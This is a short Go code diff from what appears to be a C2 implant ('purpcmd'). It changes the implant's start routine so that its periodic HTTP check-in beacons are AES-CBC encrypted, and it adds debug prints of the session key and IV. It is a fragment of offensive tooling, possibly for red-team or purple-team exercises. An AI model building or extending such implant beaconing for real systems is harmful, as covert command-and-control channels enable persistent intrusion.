@@ -2,6 +2,7 @@ package core
 
 import (
 	"encoding/base64"
+	"fmt"
 	"purpcmd/internal"
 	"purpcmd/internal/encrypt"
 	"time"
@@ -10,13 +11,16 @@ import (
 func Start() {
 	i := ImplantInit()
 
-	h := HTTPNew()
+	h := HTTPNew(i.SessionID)
 	h.HTTPSetSocket("0.0.0.0:4444")
 	h.HTTPSetURL(false, "/")
 
 	enc := encrypt.EncryptInit()
 	key, iv := enc.EncryptGetKeys()
+
 	r := PackRegistration(i, key, iv)
+
+	fmt.Println("key", base64.StdEncoding.EncodeToString(key[:]), "iv", base64.StdEncoding.EncodeToString(iv[:]))
 
 	p := base64.StdEncoding.EncodeToString(r)
 	println(p)
@@ -24,7 +28,10 @@ func Start() {
 
 	for {
 		data := PackCheck(i)
-		dataP := base64.StdEncoding.EncodeToString(data)
+		dataEnc := enc.AESCbcEncrypt(data)
+		dataP := base64.StdEncoding.EncodeToString(dataEnc)
+
+		println("sent check:",dataP)
 		resp, err := h.Get([]byte(dataP))
 		if err != nil {
 			println(err.Error())
